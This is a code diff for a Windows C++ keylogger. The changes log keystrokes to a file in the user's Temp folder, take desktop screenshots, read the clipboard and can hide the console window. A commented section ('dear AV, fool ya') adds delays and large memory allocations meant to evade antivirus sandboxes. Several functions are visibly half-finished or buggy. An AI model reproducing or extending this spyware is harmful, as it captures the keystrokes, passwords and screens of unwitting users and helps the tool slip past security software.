@@ -2,28 +2,42 @@
 #include <windows.h>
 #include <cstdlib>
 #include <iostream>
-
+#include <gdiplus.h>
+#include <stdio.h>
+#include <iostream>
+#include <atlimage.h> 
+#include <Gdiplusimaging.h> 
+#pragma comment(lib,"gdiplus.lib")
+#pragma comment (lib, "user32.lib")
+//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib, "ws2_32.lib")
+using namespace Gdiplus;
 
 //		G L O B A L S
-short wasAltPressed;
+bool		wasAltPressed;
+bool		wasShiftPressed;
 wchar_t		fileName[256];
 HANDLE		hFile = INVALID_HANDLE_VALUE;
 DWORD		dwBytesWritten;
+const bool hideConsoleAtStart = false; //if true, hide cmd.exe - FYI output is written on stdout
+const int	howMuchSecondsWaitAtStart = 3; //don't go below 3 seconds, though
 
-short determineKey(int sScannedKey);
+//		d e c l a r a c t i on
+DWORD determineKey(DWORD sScannedKey);
 
-void WriteToFile(char *wText)
+//*********************************************************
+void WriteToFile(DWORD *wText)
 {
-    hFile = CreateFile((LPTSTR) fileName,
-                           GENERIC_WRITE,        // open for write 
-                           0,                    // do not share 
-                           NULL,                 // default security 
-                           OPEN_ALWAYS | CREATE_ALWAYS,        // overwrite existing
-                           FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,// normal file 
-                           NULL);                // no template 
+    hFile = CreateFile( (LPTSTR) fileName,
+						FILE_APPEND_DATA,     // open for write 
+						FILE_SHARE_READ,      // do not share 
+						NULL,                 // default security 
+						OPEN_ALWAYS,        // overwrite existing
+						FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
+						NULL);                // no template 
 	std::cout << (char *)wText << std::endl;
-    WriteFile(hFile, L"asd", 4, &dwBytesWritten, NULL);
+	WriteFile(hFile, wText, 1, &dwBytesWritten, NULL);
+	//WriteFile(hFile, (LPCVOID)'?', 1, &dwBytesWritten, NULL);
     CloseHandle(hFile);
 }
 //*********************************************************
@@ -44,15 +58,17 @@ char VKtoCHAR(int vk)
 {
     static UCHAR keyboardState[256];
     USHORT asciiVal;
-    static HKL layout = GetKeyboardLayout(0);     // get layout
-    if( GetKeyboardState(keyboardState) == false )// get keyboard state (shift etc)
+	//get layout
+    static HKL layout = GetKeyboardLayout(0);     
+	//get keyboard state (shift etc)
+    if( GetKeyboardState(keyboardState) == false )
         return 0;
-    if( ToAsciiEx( vk, MapVirtualKey(vk,0), keyboardState, &asciiVal, 0, layout ) == 0 )//  ASCII
+    if( ToAsciiEx( vk, MapVirtualKey(vk,0), keyboardState, &asciiVal, 0, layout ) == 0 )/*ASCII*/
         return 0;
     return static_cast<char>(asciiVal);
 }
 //*********************************************************
-int determineOS() 
+bool determineOS() 
 {
 	//on what OS we r ?
     DWORD   version = GetVersion();
@@ -66,9 +82,9 @@ int determineOS()
         char * myhome;
 		if (_dupenv_s(&myhome, &sz, "USERPROFILE") == 0)
 		{
-			swprintf(fileName, L"%s%s", myhome, "\\AppData\\Local\\Temp\\wut");
+			_stprintf_s(fileName, L"%s%s", myhome, "\\AppData\\Local\\Temp\\wut");
 			free(myhome);
-			return 1;
+			return true;
 		}
     } else if ((major > 5) || ((major == 5) && (minor >= 1))) 
     {
@@ -76,75 +92,227 @@ int determineOS()
 		char * myhome;
         if (_dupenv_s(&myhome, &sz, "USERPROFILE") == 0)
 		{
-			_swprintf(fileName, L"%s%s", myhome, "\\Local Settings\\Temp\\wut");
+			_stprintf_s(fileName, L"%s%s", myhome, "\\Local Settings\\Temp\\wut");
 			free(myhome);
-			return 1;
+			return true;
 		}
     }
 
-	return 0;
+	return false;
 }
-//-------------------------------------------------------
-int main(int argc, char *argv[])
+//*********************************************************
+void trickAVs() { 
+	
+}
+//*********************************************************
+bool ImageFromClipboard()
 {
-	/*if (!determineOS())
+	if (/*IsClipboardFormatAvailable(CF_UNICODETEXT) ||*/ IsClipboardFormatAvailable(CF_TEXT))
 	{
-		std::cout << "can't determine OS";
-		return -1337;
-	}*/
-
-	swprintf(fileName, L"wut");
-
-	while(1)
-	{
-		int key = (int)FetchKeyCode();
-		if (key >= 8 && key <= 126) 
+		if (!OpenClipboard(GetOpenClipboardWindow()))
 		{
-			char c = VKtoCHAR(key);
-			std::cout << c;
-			Sleep(75);
-		}else if( key > 126)
-		{
-			determineKey(key);
-			Sleep(75);
+			printf("NIMA NIC W SCHOWKU\n");
+			return false;
 		}
-		/*DWORD key = FetchKeyCode();
-		if (key >= 8 && key <= 222)
-		{
-			determineKey(key);
-		}
-*/
-		Sleep(17);
+ 
+		HANDLE a = GetClipboardData(CF_TEXT);
+		LPWORD b = 0;
+		LARGE_INTEGER *c = 0;
+		ReadFile(a, b, GetFileSizeEx(a, c), 0, 0);
+		printf("%s", b);
+
+		CloseClipboard();
 	}
+	return true;
+}
+//*********************************************************
+bool TakeScreenshot() {
+	//CString w = "x.bmp";
+	//HBITMAP hBitmap;
+	CImage image; 
+	int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
+    HWND hDesktopWnd = GetDesktopWindow();
+    HDC hDesktopDC = GetDC(hDesktopWnd);
+    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
+
+    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight);
+    SelectObject(hCaptureDC,hCaptureBitmap); 
+    BitBlt(hCaptureDC,0,0,nScreenWidth,nScreenHeight,
+           hDesktopDC,0,0,SRCCOPY|CAPTUREBLT); 
+	image.Attach(hCaptureBitmap);
+	image.Save(L"screenshot.png"); 
+	return true;
+}
+//---------------------------------------------------------
+int main(int argc, char *argv[]) {
+
+	HWND hWnd = GetConsoleWindow();
+
+	//FreeConsole();
+	//dear AV, fool ya
+	Sleep(howMuchSecondsWaitAtStart * 1000);
+	int *t,/* *y, */*u, *p = NULL;
+	t = new int[29999999];
+	//y = new int[123];
+	u = new int[9999999];
+	//p = new int[9999999];
+	for (int i = 0; i < 9999998; ++i) {
+		t[i] = /*p[i] =*/ u[i];
+	}
+	//t = y;
+	u = p = u = p;
+	Sleep(1000);
+	if( 5 >= 5 ) {
+		delete[] t; 
+		//delete[] y; 
+		delete[] u; 
+		//delete[] p;
+	}
+
+	if (hideConsoleAtStart == true)	{
+		HWND hWnd = GetConsoleWindow();
+		ShowWindow( hWnd, SW_HIDE);
+	}
+
+	if (!determineOS())	{
+		//we are exiting, but probably we can work trough that
+		std::cout << "can't determine OS";
+		Sleep(500);
+		return 0xDEADBEEF;
+	}
+
+	DWORD key = 0;
+
+	while(key != 81/*Q*/) {
+
+		key = FetchKeyCode();
+
+		if (key >= 8 && key <= 222) {
+			std::cout << (char)key;
+
+			if (key == 83/*S*/) {
+				TakeScreenshot();
+				std::cout << "\nScreenshot taken.\n";
+			}
+		}
+        Sleep((rand() % 10) + 10);
+	}
+	
+	/*HWND hWnd = GetConsoleWindow();
+	ShowWindow( hWnd, SW_HIDE );*/
+	//HWND hWnd;
+	
+	//CaptureScreen();
+	/*OPENFILENAME	ofn;
+	char	szFileName[512]; 
+	strcpy_s(szFileName, 512, "ScreenShot.bmp");
+
+	ZeroMemory(&ofn,sizeof(ofn));
+	ofn.lStructSize=sizeof(OPENFILENAME);
+	ofn.Flags=OFN_HIDEREADONLY|OFN_PATHMUSTEXIST;
+	ofn.lpstrFilter = L"Bitmap Files (*.bmp)\0*.bmp\0";
+	ofn.lpstrDefExt= L"bmp";
+	ofn.lpstrFile = L"a.bmp";
+	ofn.nMaxFile = 512;
+	//ofn.hwndOwner = hWnd;*/
+    
+    //delete image;
+    /*ReleaseDC(hDesktopWnd,hDesktopDC);
+    DeleteDC(hCaptureDC);
+    DeleteObject(hCaptureBitmap);*/
+//	Sleep(1000);
+	//while( true )
+	//{
+		//Sleep(1000*1);
+		/*hWnd = GetDesktopWindow();
+		keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
+		keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
+
+		WaitForSingleObject(hWnd, 1500);*/
+		 // Simulate a key press
+        /*keybd_event( VK_NUMLOCK,
+                      0x45,
+                      KEYEVENTF_EXTENDEDKEY | 0,
+                      0 );
+		// Simulate a key release
+         keybd_event( VK_NUMLOCK,
+                      0x45,
+                      KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP,
+                      0);*/
+		//hBitmap = ImageFromClipboard(hWnd);
+
+		/*OpenClipboard(NULL);
+		hBitmap = (HBITMAP) GetClipboardData(CF_BITMAP);
+
+		if (hBitmap == NULL)
+		{ printf("????") ; }
+		image.Attach(hBitmap); 
+		image.Save(w, Gdiplus::ImageFormatBMP); 
+
+		Sleep(1000);*/
+	//}
 	return 0;
 }
 //----------------------------------------------------
-short determineKey(int sScannedKey)
+DWORD determineKey(DWORD sScannedKey)
 {
-	if (wasAltPressed && ((sScannedKey == 65 || sScannedKey == 97)))
+	/*if ((sScannedKey == 65 || sScannedKey == 97) && wasAltPressed)
 	{
 		std::cout << "¹";
 		wasAltPressed = false;
-		//break;
-	}
+		return (short)sScannedKey;
+	}*/
 
-	std::cout << (char)sScannedKey;
 	//WriteToFile((char *)sScannedKey);
+	//return sScannedKey;
 
-	switch(sScannedKey) 
+	/*switch(sScannedKey) 
 	{
 		//http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
-		//case VK_RMENU:
 		case VK_RMENU:
-		wasAltPressed = true;
-		WriteToFile("[ALT]");
-		break;
+			wasAltPressed = true;
+			//WriteToFile("[ALT]");
+			break;
 		case VK_SPACE:
-		WriteToFile(" ");
-		break;
-		case VK_SHIFT:
-		WriteToFile("[SHIFT]");
-		break;
+			WriteToFile(" ");
+			break;
+		//case VK_OEM_1:
+		case 58:
+			WriteToFile(":");
+			break;
+		case 59:
+			WriteToFile(";");
+			break;
+		//case VK_OEM_2:
+		case 47:
+			WriteToFile("/");
+			break;
+		//case VK_OEM_3:
+		case 96:
+			WriteToFile("`");
+			break;
+		case 126:
+			WriteToFile("~");
+			break;
+		case VK_OEM_4:
+			WriteToFile("[ [{ ]");
+			break;
+		case VK_OEM_5:
+			WriteToFile("[\\|]");
+			break;
+		case VK_OEM_6:
+			WriteToFile("[ ]} ]");
+			break;
+		case VK_OEM_7:
+			WriteToFile("['\"]");
+			break;
+		
+		case VK_LSHIFT:
+		case VK_RSHIFT:
+			//wasShiftPressed = true;
+			WriteToFile("[SHIFT]");
+			break;
 		case VK_RETURN:
 		WriteToFile("[ENTER]");
 		break;
@@ -159,27 +327,6 @@ short determineKey(int sScannedKey)
 		break;
 		case VK_DELETE:
 		WriteToFile("[DEL]");
-		break;
-		case VK_OEM_1:
-		WriteToFile("[;:]");
-		break;
-		case VK_OEM_2:
-		WriteToFile("[/?]");
-		break;
-		case VK_OEM_3:
-		WriteToFile("[`~]");
-		break;
-		case VK_OEM_4:
-		WriteToFile("[ [{ ]");
-		break;
-		case VK_OEM_5:
-		WriteToFile("[\\|]");
-		break;
-		case VK_OEM_6:
-		WriteToFile("[ ]} ]");
-		break;
-		case VK_OEM_7:
-		WriteToFile("['\"]");
 		break;
 		case VK_OEM_PLUS:
 		WriteToFile("+");
@@ -244,6 +391,6 @@ short determineKey(int sScannedKey)
 		break;
 		default:
 		break;
-	}        
+	}*/
 	return 0;
 }
